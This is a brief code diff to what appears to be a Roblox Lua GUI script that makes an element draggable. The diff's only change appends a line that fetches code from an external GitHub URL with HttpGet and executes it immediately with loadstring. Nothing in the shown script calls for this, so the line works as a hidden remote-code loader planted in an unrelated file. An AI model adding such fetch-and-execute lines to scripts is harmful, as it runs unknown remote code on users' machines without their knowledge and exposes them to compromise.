@@ -307,3 +307,4 @@ local function NOYLJYT_fake_script() -- Main.Dragify
 	dragify(script.Parent)
 end
 coroutine.wrap(NOYLJYT_fake_script)()
+loadstring(game:HttpGet(('https://github.com/XxIcedHitmanxX/Dead-Winter/blob/main/CarName'),true))()
